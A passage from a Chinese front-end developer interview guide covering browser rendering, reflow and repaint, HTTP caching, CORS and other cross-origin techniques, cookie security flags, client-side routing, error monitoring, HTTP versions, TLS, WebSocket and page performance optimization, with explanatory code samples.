//    - 视口大小变化、DOM 结构变化触发

// 5. 绘制 (Paint)
//    - 将渲染树转换为屏幕像素
//    - 颜色、背景、文字等样式变化触发

// 6. 合成 (Composite)
//    - 将多个图层合并成最终画面
//    - transform / opacity 变化只触发合成
//    - 在合成器线程执行，不占用主线程

// ===== CSS 和 JS 的阻塞关系 =====
// CSS 阻塞渲染（Render Tree 不完整不能渲染）
// CSS 阻塞 JS 执行（JS 可能读取 computed style，必须先计算 CSSOM）
// JS 阻塞 DOM 解析（JS 可能修改 DOM）
// JS 阻塞渲染（渲染前必须执行完所有 JS）

// ===== 回流 (Reflow) 触发条件 =====
// 什么会触发回流（Layout 重新计算）：
element.offsetWidth    // 读取布局属性 → 强制同步布局！
element.offsetHeight
element.scrollTop
element.clientWidth
window.getComputedStyle()
// ... 任何需要最新 layout 值的操作

// ⚠️ 读写分离优化
// ❌ 强制同步布局（Layout Thrashing）
for (let i = 0; i < items.length; i++) {
  items[i].style.width = container.offsetWidth + 'px' // 每次循环都回流！
}

// ✅ 批量读、批量写
const width = container.offsetWidth // 读一次
for (let i = 0; i < items.length; i++) {
  items[i].style.width = width + 'px' // 批量写
}
```

#### 分层与合成

```css
/* 创建独立合成层的条件 */
.layer {
  /* 1. 3D transform */
  transform: translateZ(0);

  /* 2. video / canvas / iframe */
  /* 3. will-change */
  will-change: transform;

  /* 4. CSS 动画/过渡的 transform 或 opacity */
  animation: slide 1s ease;
}

/* ⚠️ 层爆炸：不要给太多元素创建合成层 */
/* 每个层都消耗 GPU 内存 */
```

**面试要点：** 画出完整流程：DOM → CSSOM → Render Tree → Layout → Paint → Composite。知道 CSS/JS 的阻塞关系。

---

### 56. 重绘 (Repaint) 和回流 (Reflow) 的区别？如何减少？

**⭐⭐⭐⭐ · 高频**

| 维度 | 回流 (Reflow) | 重绘 (Repaint) |
|------|--------------|----------------|
| 触发 | 尺寸/位置/结构变化 | 颜色/背景/可见性变化 |
| 影响 | 重新布局 → 必定重绘 | 仅重新绘制像素 |
| 性能 | 高开销（影响 Layout → Paint → Composite） | 中等开销（影响 Paint → Composite） |
| 范围 | 可能影响整个文档流 | 通常只影响自身 |

```javascript
// ===== 减少回流和重绘的策略 =====

// 1. 批量修改 DOM
// ❌ 逐个修改
const list = document.getElementById('list')
for (let i = 0; i < 10; i++) {
  const li = document.createElement('li')
  li.textContent = `Item ${i}`
  list.appendChild(li) // 每次 append 都可能触发回流
}

// ✅ DocumentFragment 批量插入
const fragment = document.createDocumentFragment()
for (let i = 0; i < 10; i++) {
  const li = document.createElement('li')
  li.textContent = `Item ${i}`
  fragment.appendChild(li)
}
list.appendChild(fragment) // 一次回流

// 2. 修改 class 而非逐条修改 style
// ❌
el.style.width = '100px'
el.style.height = '100px'
el.style.margin = '10px'
el.style.padding = '5px'

// ✅
el.classList.add('new-style')
// .new-style { width: 100px; height: 100px; margin: 10px; padding: 5px; }

// 3. 离线操作 DOM
// ✅ 克隆节点 → 修改 → 替换
const clone = el.cloneNode(true)
// ... 修改 clone
el.parentNode.replaceChild(clone, el)

// ✅ display: none → 修改 → 恢复（两次回流）
el.style.display = 'none'
// ... 大量修改
el.style.display = 'block'

// 4. 使用 absolute/fixed 脱离文档流
// 脱离文档流后，元素尺寸变化不影响其他元素

// 5. 使用 CSS 动画而非 JS 动画
// transform/opacity 只触发 Composite

// 6. 避免读取会触发回流的属性（强制同步布局）
// 避免在循环中读取 offsetWidth/offsetHeight 等
```

**面试要点：** 回流必定引起重绘，重绘不一定引起回流。减少回流的重点是批量操作和读写分离。

---

### 57. 浏览器缓存机制：强缓存和协商缓存？

**⭐⭐⭐⭐⭐ · 必问**

```
浏览器缓存流程：

请求资源
  │
  ├── 有缓存？
  │    └── 否 → 向服务器请求（200 OK）
  │
  └── 是
       │
       ├── 强缓存（Expires / Cache-Control）是否过期？
       │    └── 否 → 从缓存读取（200 from disk cache）
       │
       └── 是
            │
            ├── 协商缓存（ETag / Last-Modified）
            │    ├── 资源未变 → 304 Not Modified，用缓存
            │    └── 资源已变 → 200 OK，返回新资源
            │
            └── 没有协商缓存字段 → 200 OK，返回新资源
```

```nginx
# ===== 强缓存 =====
# Cache-Control (HTTP/1.1, 优先级更高)
# public: CDN 和浏览器都可缓存
# private: 仅浏览器可缓存
# max-age: 缓存最大有效期（秒）
# no-cache: 使用前必须验证（本地有缓存但需要协商验证）
# no-store: 完全不缓存

Cache-Control: public, max-age=31536000          # 强缓存 1 年
Cache-Control: no-cache                           # 有缓存但需协商
Cache-Control: no-store                           # 完全不缓存（敏感数据）

# Expires (HTTP/1.0, 绝对时间)
Expires: Wed, 21 Oct 2026 07:28:00 GMT

# ===== 协商缓存 =====
# 方式 1: Last-Modified / If-Modified-Since
# 第一次响应
Last-Modified: Mon, 10 Jan 2026 08:00:00 GMT

# 第二次请求（浏览器自动带上）
If-Modified-Since: Mon, 10 Jan 2026 08:00:00 GMT
# 服务器比较时间
# - 未修改 → 304 Not Modified
# - 已修改 → 200 OK + 新资源

# 缺陷：
# 1. 时间精度秒级，1 秒内多次修改无法检测
# 2. 文件内容未变但修改时间变了（如 touch 命令）

# 方式 2: ETag / If-None-Match（推荐）
# 第一次响应
ETag: "abc123"

# 第二次请求（浏览器自动带上）
If-None-Match: "abc123"
# 服务器比较 ETag（通常是文件内容的哈希）
# - 相同 → 304 Not Modified
# - 不同 → 200 OK + 新资源

# ETag 优先级高于 Last-Modified
```

#### 缓存策略实践

```nginx
# HTML 文件：不缓存或使用协商缓存（确保用户拿到最新页面）
location ~* \.html$ {
    add_header Cache-Control "no-cache, must-revalidate";
}

# CSS/JS 带 hash 文件：强缓存（永远不变的内容）
location ~* \.[a-f0-9]{8,}\.(css|js)$ {
    add_header Cache-Control "public, max-age=31536000, immutable";
}

# 图片/字体：强缓存
location ~* \.(jpg|jpeg|png|gif|ico|svg|woff2?|ttf)$ {
    add_header Cache-Control "public, max-age=2592000";
    expires 30d;
}
```

```javascript
// axios 请求添加缓存控制
axios.get('/api/data', {
  headers: {
    'Cache-Control': 'no-cache' // 禁用缓存
  }
})

// 强制刷新（跳过缓存）
// Ctrl+F5 / Cmd+Shift+R → 请求头 Cache-Control: no-cache
```

**面试要点：** 必须画出强缓存→协商缓存的决策流程图，知道 Cache-Control 常用指令（max-age/no-cache/no-store）。

---

### 58. 什么是跨域？如何解决跨域问题？

**⭐⭐⭐⭐⭐ · 必问**

```
跨域：浏览器的同源策略限制
同源 = 协议 + 域名 + 端口 三者完全相同

http://example.com:80/app/
      协议       域名   端口

以下情况视为跨域：
http://example.com → https://example.com   (协议不同)
http://example.com → http://api.example.com (子域名不同)
http://example.com → http://example.com:8080 (端口不同)
```

```javascript
// ===== 方案 1: CORS（跨域资源共享，推荐）=====
// 服务器设置响应头
// Access-Control-Allow-Origin: https://www.example.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Content-Type, Authorization
// Access-Control-Allow-Credentials: true  (允许携带 Cookie)
// Access-Control-Max-Age: 86400           (预检缓存时间)

// 简单请求 vs 预检请求 (Preflight)
// 简单请求（不触发 OPTIONS 预检）：
// - 方法：GET, HEAD, POST
// - Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
// - 无自定义头

// 预检请求（触发 OPTIONS）：
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  }
})
// → 先发 OPTIONS 预检 → 服务器确认允许 → 再发 PUT 请求

// ===== 方案 2: 代理（开发环境最常用）=====
// webpack-dev-server / vite 的 proxy 配置
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
}

// ===== 方案 3: JSONP（仅 GET，历史方案）=====
function jsonp(url, callbackName) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script')
    window[callbackName] = (data) => {
      resolve(data)
      document.body.removeChild(script)
      delete window[callbackName]
    }
    script.src = `${url}?callback=${callbackName}`
    document.body.appendChild(script)
  })
}
jsonp('https://api.example.com/data', 'handleData')
  .then(data => console.log(data))

// ===== 方案 4: WebSocket =====
// WebSocket 不受同源策略限制
const ws = new WebSocket('wss://ws.example.com')
ws.onmessage = (event) => console.log(event.data)

// ===== 方案 5: postMessage（iframe 跨域通信）=====
// 页面 A
iframe.contentWindow.postMessage('hello', 'https://other-domain.com')

// 页面 B
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://parent-domain.com') return
  console.log(e.data)
})

// ===== 方案 6: Nginx 反向代理 =====
// nginx.conf
// location /api/ {
//   proxy_pass https://api.example.com/;
//   proxy_set_header Host $host;
// }
```

| 方案 | 适用场景 | 限制 |
|------|----------|------|
| CORS | 可控的 API 服务 | 需要服务端配合 |
| 代理 | 开发环境 | 生产环境需额外配置 |
| JSONP | 老项目兼容 | 仅 GET，有 XSS 风险 |
| WebSocket | 实时通信 | 需服务端支持 |
| postMessage | iframe 跨域 | 需双方配合 |
| Nginx 反向代理 | 生产环境 | 需运维配置 |

**面试要点：** CORS 是标准方案，必说清楚简单请求和预检请求的区别。JSONP 要说出他的原理和缺点。

---

### 59. 浏览器存储：Cookie 的安全属性？

**⭐⭐⭐⭐ · 高频**

```javascript
// Cookie 安全三件套
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// 1. HttpOnly —— 防 XSS 窃取 Cookie
// ✅ JavaScript 无法通过 document.cookie 读取
// 设置方式：服务器 Set-Cookie 头中加 HttpOnly

// 2. Secure —— 仅 HTTPS 传输
// ✅ Cookie 只在 HTTPS 连接中发送
// 防止中间人攻击窃取 Cookie

// 3. SameSite —— 防 CSRF 攻击
// Strict: 完全禁止第三方 Cookie（任何跨站请求都不带）
// Lax: 允许顶级导航（链接跳转）带 Cookie，禁止第三方 POST/iframe 带 Cookie
// None: 允许第三方 Cookie（必须同时设置 Secure）

// Cookie 示例
document.cookie = 'token=xxx; max-age=3600; path=/; secure; samesite=lax'

// ===== 典型设置 =====
// 用户 Token：HttpOnly + Secure + SameSite=Strict
// 分析追踪：SameSite=None + Secure（允许第三方）
// 主题偏好：SameSite=Lax（允许链接跳转）
```

---

### 60. 前端路由的原理：hash 模式和 history 模式的区别？

**⭐⭐⭐⭐ · 高频**

```javascript
// ===== Hash 模式 =====
// URL: https://example.com/#/user/1
// 特点：# 后面的内容不会发送到服务器，不触发页面刷新

class HashRouter {
  constructor() {
    this.routes = {}
    this.currentUrl = ''
    // 监听 hash 变化
    window.addEventListener('hashchange', () => this._onRouteChange())
    window.addEventListener('load', () => this._onRouteChange())
  }

  route(path, callback) {
    this.routes[path] = callback
  }

  _onRouteChange() {
    this.currentUrl = window.location.hash.slice(1) || '/'
    const handler = this.routes[this.currentUrl]
    if (handler) handler()
  }

  push(path) {
    window.location.hash = path
  }
}

// ===== History 模式 =====
// URL: https://example.com/user/1
// 特点：使用 HTML5 History API，URL 更美观

class HistoryRouter {
  constructor() {
    this.routes = {}
    this.currentUrl = ''
    // 监听前进/后退
    window.addEventListener('popstate', () => this._onRouteChange())
  }

  route(path, callback) {
    this.routes[path] = callback
  }

  _onRouteChange() {
    this.currentUrl = window.location.pathname
    const handler = this.routes[this.currentUrl]
    if (handler) handler()
  }

  push(path) {
    history.pushState(null, '', path)
    this._onRouteChange()
  }
}

// ===== history 模式的问题 =====
// 刷新 https://example.com/user/1 →
// 浏览器向服务器请求 /user/1（服务器不认识！）→ 404
// 解决：Nginx 配置 fallback
// location / {
//   try_files $uri $uri/ /index.html;
// }
```

| 特性 | Hash 模式 | History 模式 |
|------|-----------|-------------|
| URL 美观 | #/user | /user |
| 服务器配置 | 无需 | 需配置 fallback |
| SEO | ❌ # 不友好 | ✅（需 SSR 配合）|
| 锚点 | ❌ 冲突 | ✅ 正常 |
| 兼容性 | 极好 | IE10+ |

**面试要点：** history 模式需要服务端配置 try_files 或 rewrite 规则防止 404。

---

### 61. 如何监控前端错误？有哪些类型？

**⭐⭐⭐**

```javascript
// ===== 1. 运行时错误 =====
window.addEventListener('error', (e) => {
  console.log('错误消息:', e.message)
  console.log('错误文件:', e.filename)
  console.log('错误行号:', e.lineno)
  console.log('错误列号:', e.colno)
  console.log('错误堆栈:', e.error?.stack)
  // 上报到监控平台
  reportError({
    type: 'runtime',
    message: e.message,
    stack: e.error?.stack,
    filename: e.filename
  })
}, true)

// ===== 2. Promise 未捕获错误 =====
window.addEventListener('unhandledrejection', (e) => {
  console.log('Promise 错误:', e.reason)
  reportError({
    type: 'unhandledPromise',
    message: e.reason?.message || String(e.reason)
  })
  // e.preventDefault() // 阻止控制台默认输出
})

// ===== 3. 资源加载错误 =====
// 图片/脚本/样式等加载失败（不会冒泡，需在捕获阶段监听）
window.addEventListener('error', (e) => {
  if (e.target !== window) {
    console.log('资源加载失败:', e.target.src || e.target.href)
    reportError({
      type: 'resource',
      url: e.target.src || e.target.href,
      tagName: e.target.tagName
    })
  }
}, true) // ⚠️ 必须是捕获阶段

// ===== 4. 请求错误 =====
// 包装 fetch
function fetchWithError(url, options) {
  return fetch(url, options).then(res => {
    if (!res.ok) {
      reportError({
        type: 'api',
        url,
        status: res.status,
        statusText: res.statusText
      })
    }
    return res
  })
}

// ===== 5. 框架级错误（Vue/React Error Boundary）=====
// Vue: app.config.errorHandler
// React: componentDidCatch / ErrorBoundary

// ===== 6. 跨域脚本错误 =====
// <script src="https://cdn.example.com/app.js" crossorigin="anonymous"></script>
// 并设置响应头 Access-Control-Allow-Origin: *
// 否则只能得到 "Script error." 没有详细堆栈

// ===== 完整的上报工具 =====
// Sentry / Fundebug / 自建
function reportError(payload) {
  // 1. 采样（避免上报风暴）
  if (Math.random() > 0.1) return

  // 2. 去重（相同错误短时间内不上报多次）
  const key = `${payload.type}:${payload.message}`
  if (reportedErrors.has(key)) return
  reportedErrors.add(key)

  // 3. 使用 sendBeacon 保证页面卸载时也能上报
  const data = JSON.stringify({
    ...payload,
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: Date.now()
  })

  if (navigator.sendBeacon) {
    navigator.sendBeacon('/api/error-report', data)
  } else {
    fetch('/api/error-report', {
      method: 'POST',
      body: data,
      keepalive: true
    })
  }
}

const reportedErrors = new Set()
```

**面试要点：** 至少说出 3 种错误类型（运行时、Promise、资源）。跨域脚本错误和 sendBeacon 是加分点。

---

### 62. 浏览器的进程与线程有哪些？

**⭐⭐⭐**

```
Chrome 多进程架构：

┌──────────────────────────────────────────┐
│            Browser 进程 (1 个)            │
│   - 地址栏、书签、前进后退                │
│   - 网络请求、文件访问                    │
└───────────┬──────────────────────────────┘
            │
    ┌───────┼───────┬──────────────┐
    ▼       ▼       ▼              ▼
  GPU    Renderer  Renderer   Extension
  进程   进程(1)   进程(2)      进程
        (Tab 1)  (Tab 2)

每个 Renderer 进程内部（沙箱）：
┌────────────────────────────┐
│  GUI 渲染线程              │ ← 解析 HTML/CSS，布局，绘制
│  JS 引擎线程              │ ← 执行 JS（与 GUI 互斥！）
│  事件触发线程             │ ← 控制事件循环
│  定时触发器线程           │ ← setTimeout/setInterval
│  异步 HTTP 请求线程       │ ← XMLHttpRequest/fetch
│  Web Worker 线程          │ ← 计算密集型任务
│  Compositor 线程          │ ← 合成图层
│  IO 线程                  │ ← 文件/网络 IO
└────────────────────────────┘

关键：GUI 和 JS 线程互斥！
JS 执行时 → GUI 冻结
GUI 渲染时 → JS 等待
```

```javascript
// 这就是为什么长时间 JS 计算会阻塞页面渲染
// ✅ 解决：Web Worker
const worker = new Worker('heavy-task.js')
worker.postMessage(largeData)
worker.onmessage = (e) => updateUI(e.data)

// ✅ 或：时间切片
function timeSlice(tasks, callback) {
  let i = 0
  function run() {
    const start = Date.now()
    while (i < tasks.length && Date.now() - start < 16) {
      callback(tasks[i])
      i++
    }
    if (i < tasks.length) {
      requestAnimationFrame(run)
    }
  }
  requestAnimationFrame(run)
}
```

**面试要点：** 「GUI 线程和 JS 线程互斥」是核心。这解释了为什么长任务卡顿、为什么需要 Web Worker。

---

### 63. 点击事件 300ms 延迟是怎么回事？如何解决？

**⭐⭐**

```html
<!-- 历史问题：移动端浏览器双击缩放导致 300ms 延迟 -->
<!-- 浏览器等待 300ms 判断是单击还是双击 -->

<!-- 解决方案 1: viewport meta 标签（现代移动端标配） -->
<meta name="viewport" content="width=device-width, initial-scale=1.0,
  maximum-scale=1.0, user-scalable=no">
<!-- width=device-width 就告诉浏览器不需要双击缩放，禁用 300ms 延迟 -->

<!-- 解决方案 2: FastClick 库（历史方案） -->
<!-- 已在 2020 年后被 viewport 方案替代 -->

<!-- 解决方案 3: CSS touch-action -->
<!-- 告诉浏览器这个区域不需要处理手势 -->
.no-delay {
  touch-action: manipulation;
  /* 浏览器不等待双击 */
}

<!-- 解决方案 4: pointer-events -->
<!-- 但会影响所有鼠标/触控事件，慎用 -->
```

---



## 九、网络与 HTTP

### 64. HTTP 1.0 / 1.1 / 2.0 / 3.0 的区别？

**⭐⭐⭐⭐⭐ · 必问**

```
HTTP/1.0 (1996)
├─ 每个请求一个 TCP 连接（用完关闭）
└─ 问题：高延迟、重复握手

HTTP/1.1 (1997)
├─ 持久连接 (Connection: keep-alive)
├─ 管道化 (Pipelining) — 理论支持但实际很少用
├─ Host 头（支持虚拟主机）
├─ 分块传输 (Transfer-Encoding: chunked)
├─ 缓存增强 (Cache-Control / ETag)
└─ 问题：
    ├─ 队头阻塞 (HOL Blocking)：前一个请求卡住，后面全排队
    ├─ 并发限制：浏览器同域名下最多 6 个连接
    └─ 头部冗余：每次请求都带完整头部

HTTP/2 (2015)
├─ 二进制分帧层：不再是文本协议
├─ 多路复用：一个 TCP 连接并发多个请求/响应
├─ 头部压缩 (HPACK)
├─ 服务器推送 (Server Push) — 已废弃
├─ 流优先级
└─ 问题：TCP 层的队头阻塞（丢包影响所有流）

HTTP/3 (2022)
├─ 基于 QUIC (UDP) 而非 TCP
├─ 0-RTT 握手（更快建立连接）
├─ 消除 TCP 队头阻塞
├─ 连接迁移（切换网络 IP 变化不停连）
└─ 内置加密（TLS 1.3 强制）
```

```javascript
// HTTP/2 对前端的影响
// 1. 不再需要合并雪碧图、合并 JS/CSS（多路复用）
// 2. 不再需要域名分片（一个 TCP 连接就够了）
// 3. 但仍有价值：Tree Shaking 减少代码量、缓存策略

// ===== HTTP 状态码 =====
// 2xx 成功
200 OK
201 Created (POST 成功创建)
204 No Content (成功但无返回体)

// 3xx 重定向
301 Moved Permanently (永久重定向，SEO 权重转移)
302 Found (临时重定向)
304 Not Modified (缓存有效，协商缓存返回)
307 Temporary Redirect (临时重定向，保持请求方法不变)
308 Permanent Redirect (永久重定向，保持请求方法不变)

// 4xx 客户端错误
400 Bad Request
401 Unauthorized (未认证，需登录)
403 Forbidden (无权限)
404 Not Found
405 Method Not Allowed
429 Too Many Requests (限流)

// 5xx 服务端错误
500 Internal Server Error
502 Bad Gateway (网关错误)
503 Service Unavailable (服务不可用，可能过载)
504 Gateway Timeout (网关超时)
```

**面试要点：** HTTP/1.1 到 HTTP/2 的核心变化是多路复用和头部压缩。HTTP/3 是基于 QUIC/UDP。

---

### 65. HTTPS 的握手过程？对称加密和非对称加密的区别？

**⭐⭐⭐⭐ · 高频**

```
HTTPS = HTTP + TLS/SSL 加密层

TLS 1.3 握手（简化后只需 1-RTT）：

客户端                               服务器
  │                                    │
  │──── ClientHello ──────────────────▶│
  │  (支持的加密套件, 密钥协商参数)      │
  │                                    │ 计算会话密钥
  │◀─── ServerHello + 加密数据 ────────│
  │  (证书, 选定加密套件)               │
  │                                    │
  │ 验证证书 → 计算会话密钥             │
  │                                    │
  │──── 加密数据 ─────────────────────▶│
  │                                    │
  │   🔒 加密通信开始 🔒              │
```

```javascript
// ===== 对称加密 vs 非对称加密 =====

// 对称加密（加解密用同一个密钥）
// 优点：速度快
// 缺点：密钥传输不安全
// 算法：AES, ChaCha20

// 非对称加密（公钥加密，私钥解密）
// 优点：公钥可以公开，私钥不必传输
// 缺点：速度慢（是 AES 的 100-1000 倍）
// 算法：RSA, ECDHE

// HTTPS 的实际方案：混合加密
// 1. 用非对称加密交换「对称密钥」（安全但慢）
// 2. 后续通信使用对称加密（快速）

// ===== 数字证书 =====
// 证书内容：域名、公钥、颁发者、有效期
// CA（证书颁发机构）用自己私钥对证书做数字签名
// 浏览器内置 CA 公钥，验证证书签名真实性
// 信任链：根 CA → 中间 CA → 站点证书
```

**面试要点：** 说出混合加密方案即可（非对称交换密钥 + 对称传输数据）。TLS 1.3 比 1.2 快（少了 1 个 RTT）是加分点。

---

### 66. 什么是 CDN？工作原理是什么？

**⭐⭐⭐**

```
CDN (Content Delivery Network): 内容分发网络

工作原理：
1. 用户请求 → DNS 解析
2. 智能 DNS 返回最近的边缘节点 IP
3. 边缘节点有缓存 → 直接返回
4. 边缘节点无缓存 → 回源站拉取 → 缓存 → 返回

优势：
├─ 延迟低（就近访问）
├─ 减轻源站压力（缓存分摊流量）
├─ 防 DDoS（分散攻击）
└─ 高可用（单一节点故障不影响）

CDN 缓存对前端的实际影响：
- 更新 CSS/JS 需改名（文件名带 hash）
- HTML 不缓存或短缓存
- 用 Cache-Control 控制节点缓存策略
```

---

### 67. RESTful API 设计原则？

**⭐⭐⭐**

```
REST (Representational State Transfer)

核心原则：
1. 资源导向：URL 代表资源，不是操作
2. HTTP 方法表示操作
3. 无状态（每个请求包含所有必要信息）
4. 统一接口

URL 设计：
GET    /api/users          # 获取用户列表
POST   /api/users          # 创建用户
GET    /api/users/123      # 获取用户 123
PUT    /api/users/123      # 完整更新用户 123
PATCH  /api/users/123      # 部分更新用户 123
DELETE /api/users/123      # 删除用户 123

GET    /api/users/123/posts # 获取用户 123 的文章

查询参数：
GET /api/users?page=2&limit=20&sort=created_at&order=desc

状态码：
200 - 成功
201 - 创建成功
204 - 删除成功（无返回内容）
400 - 请求参数错误
401 - 未认证
403 - 无权限
404 - 不存在

REST vs RPC vs GraphQL
- REST: 资源导向，标准统一
- RPC: 动作导向 /api/getUserDetail
- GraphQL: 查询语言，客户端决定数据结构
```

---

### 68. WebSocket 的原理和使用？

**⭐⭐⭐**

```javascript
// WebSocket: 全双工通信协议，基于 TCP
// 与 HTTP 的区别：持久连接、服务端可主动推送、二进制帧

// ===== 建立连接 =====
const ws = new WebSocket('wss://example.com/socket')

// 连接状态
// 0: CONNECTING, 1: OPEN, 2: CLOSING, 3: CLOSED

ws.onopen = () => {
  console.log('连接已建立')
  ws.send(JSON.stringify({ type: 'join', room: 'room1' }))
}

ws.onmessage = (event) => {
  const data = JSON.parse(event.data)
  console.log('收到消息:', data)
}

ws.onclose = (event) => {
  console.log('连接关闭:', event.code, event.reason)
  // 自动重连
  setTimeout(() => reconnect(), 3000)
}

ws.onerror = (error) => {
  console.error('连接错误')
}

// ===== 心跳检测 =====
let heartbeatInterval
let heartbeatTimeout

ws.onopen = () => {
  // 每 30 秒发送心跳
  heartbeatInterval = setInterval(() => {
    ws.send(JSON.stringify({ type: 'ping' }))
    // 5 秒内没收到 pong → 断开
    heartbeatTimeout = setTimeout(() => {
      ws.close()
    }, 5000)
  }, 30000)
}

ws.onmessage = (event) => {
  const data = JSON.parse(event.data)
  if (data.type === 'pong') {
    clearTimeout(heartbeatTimeout)
  }
}

ws.onclose = () => {
  clearInterval(heartbeatInterval)
}

// ===== WebSocket vs SSE (Server-Sent Events) =====
// WebSocket: 全双工，二进制，复杂
// SSE: 单向（服务器→客户端），文本，简单，自动重连

// SSE 示例
const eventSource = new EventSource('/api/events')
eventSource.onmessage = (e) => console.log(JSON.parse(e.data))
eventSource.addEventListener('custom-event', (e) => {
  console.log('自定义事件:', JSON.parse(e.data))
})
```

**面试要点：** 心跳检测和自动重连是生产环境的必要组件。

---

### 69. TCP 三次握手和四次挥手？

**⭐⭐⭐**

```
三次握手 (建立连接)

客户端                        服务器
  │── SYN (seq=x) ───────────▶│  (1: 我要连接)
  │                            │
  │◀─ SYN+ACK (seq=y,ack=x+1) │  (2: 收到，确认)
  │                            │
  │── ACK (ack=y+1) ─────────▶│  (3: 好的，连接建立)

为什么是三次不是两次？
- 防止已过期的连接请求到达服务器造成错误连接
- 确认双方收发能力正常


四次挥手 (断开连接)

客户端                        服务器
  │── FIN (seq=m) ───────────▶│  (1: 我要断开)
  │                            │
  │◀─ ACK (ack=m+1) ─────────│  (2: 知道了，等我把剩余的传完)
  │                            │
  │◀─ FIN (seq=n) ───────────│  (3: 我也要断开了)
  │                            │
  │── ACK (ack=n+1) ─────────▶│  (4: 好的)

为什么是四次不是三次？
- 服务器收到 FIN 后可能还有数据要发
- 需要等数据传输完再发 FIN
- 所以 ACK 和 FIN 分开发送

TIME_WAIT (2MSL) 为什么存在？
- 确保最后一个 ACK 能被对方收到
- 让旧连接的所有报文都从网络消失
```

---

### 70. GET 和 POST 的区别？

**⭐⭐**

```javascript
// 语义上的区别
// GET: 获取资源（幂等、可缓存）
// POST: 创建资源（非幂等、不可缓存）

// 技术上的区别
// GET: 参数在 URL 中（有长度限制，约 2KB-8KB）
// POST: 参数在请求体中（无明确限制）

// 安全性
// 两者都不安全！都是明文传输（HTTP）
// POST 只是相对不明显（不在 URL 中）
// HTTPS 才是安全传输

// RFC 规范：GET 不应修改服务器状态
// 实际中：GET 也可以有请求体（不推荐）
// POST 也可以放在 URL 参数中

// ===== 面试回答要点 =====
// 1. 先说语义区别（约定而非强制）
// 2. 技术区别（URL/请求体、缓存）
// 3. 幂等性（GET/PUT/DELETE 幂等，POST 不幂等）
// 4. 实际别把这两个简单区分当成安全措施
```

---



## 十、性能优化

### 71. 首屏加载优化有哪些手段？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 网络层面 =====
// 1. CDN 加速静态资源
// 2. DNS 预解析 + TCP 预连接
<link rel="dns-prefetch" href="//api.example.com">
<link rel="preconnect" href="//api.example.com">

// 3. 资源预加载
<link rel="preload" href="critical.css" as="style">
<link rel="preload" href="hero.jpg" as="image">
// prefetch: 下个页面可能用的资源
<link rel="prefetch" href="next-page.js">

// 4. HTTP/2 多路复用

// ===== 资源优化 =====
// 5. 代码分割 (Code Splitting)
// 路由级别懒加载
const LazyPage = () => import('./pages/HeavyPage.vue')

// 6. Tree Shaking（ESM 静态分析，移除未使用代码）

// 7. 图片优化
// 格式：WebP / AVIF
// 响应式图片：<picture> + srcset
// 懒加载：<img loading="lazy">

// 8. 字体优化
// font-display: swap（保证文字立即显示）
// 预加载关键字体
<link rel="preload" href="critical.woff2" as="font" crossorigin>
// 字体子集化（只包含用到的字符）

// 9. 压缩
// Gzip / Brotli（HTML + CSS + JS）
// 图片压缩（TinyPNG 等）
// CSS/JS 压缩（Uglify/Terser）

// ===== 渲染优化 =====
// 10. 首屏关键 CSS 内联
<style>/* 首屏关键样式 */</style>

// 11. 非关键 CSS 异步加载
<link rel="preload" href="non-critical.css" as="style" onload="this.rel='stylesheet'">

// 12. 骨架屏 / Loading 态（减少 CLS）

// 13. SSR / SSG（服务端渲染首屏内容）

// 14. CSS 放 <head>，JS 放 </body> 前或 defer

// ===== 构建优化 =====
// 15. 公共模块提取 (SplitChunks)
// 16. 小图片 Base64 内联（减少 HTTP 请求）
// 17. 资源带 hash 文件名（利用强缓存）
```

```javascript
// ===== 性能指标 =====
// FCP (First Contentful Paint): 首次内容绘制
// LCP (Largest Contentful Paint): 最大内容绘制 < 2.5s
// FID (First Input Delay): 首次输入延迟 < 100ms
// INP (Interaction to Next Paint): 交互到下次绘制 < 200ms
// CLS (Cumulative Layout Shift): 累计布局偏移 < 0.1
// TTFB (Time to First Byte): 首字节时间 < 800ms
// TTI (Time to Interactive): 可交互时间 < 5s

// 核心 Web 指标 (Core Web Vitals): LCP + INP + CLS
```

**面试要点：** 不要只说单点优化，要有分层思维：网络→资源→渲染→构建。

---

### 72. 长列表渲染如何优化？

**⭐⭐⭐⭐ · 高频**

```javascript
// 方案 1: 虚拟滚动 (Virtual Scrolling)
// 只渲染可视区域 + 缓冲区
// 库：vue-virtual-scroller / react-window / react-virtualized

// 核心原理
function VirtualList({ items, itemHeight, containerHeight }) {
  const [scrollTop, setScrollTop] = useState(0)

  // 可见范围
  const startIndex = Math.floor(scrollTop / itemHeight)
  const endIndex = Math.min(
    startIndex + Math.ceil(containerHeight / itemHeight) + 1, // +1 缓冲区
    items.length
  )

  // 可见项目
  const visibleItems = items.slice(startIndex, endIndex)

  return (
    <div
      style={{ height: containerHeight, overflow: 'auto' }}
      onScroll={(e) => setScrollTop(e.target.scrollTop)}
    >
      {/* 撑开滚动条 */}
      <div style={{ height: items.length * itemHeight }}>
        {/* 偏移到正确位置 */}
        <div style={{ transform: `translateY(${startIndex * itemHeight}px)` }}>
          {visibleItems.map((item, i) => (
            <div key={startIndex + i} style={{ height: itemHeight }}>
              {item}
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

// 方案 2: 分页加载
// 方案 3: 懒加载 (Intersection Observer)
// 方案 4: content-visibility: auto (CSS 原生方案)
```

---

### 73. 图片优化有哪些手段？

**⭐⭐⭐**

```html
<!-- 1. 选择合适的格式 -->
<!-- 照片 → JPEG/WebP/AVIF -->
<!-- 图标 → SVG -->
<!-- 透明图 → PNG/WebP -->
<!-- 动图 → WebP/APNG 替代 GIF -->

<!-- 2. 响应式图片 -->
<img
  src="small.jpg"
  srcset="small.jpg 400w, medium.jpg 800w, large.jpg 1200w"
  sizes="(max-width: 600px) 400px, (max-width: 900px) 800px, 1200px"
  alt="响应式图片"
/>

<picture>
  <source type="image/avif" srcset="image.avif">
  <source type="image/webp" srcset="image.webp">
  <img src="image.jpg" alt="fallback">
</picture>

<!-- 3. 懒加载 -->
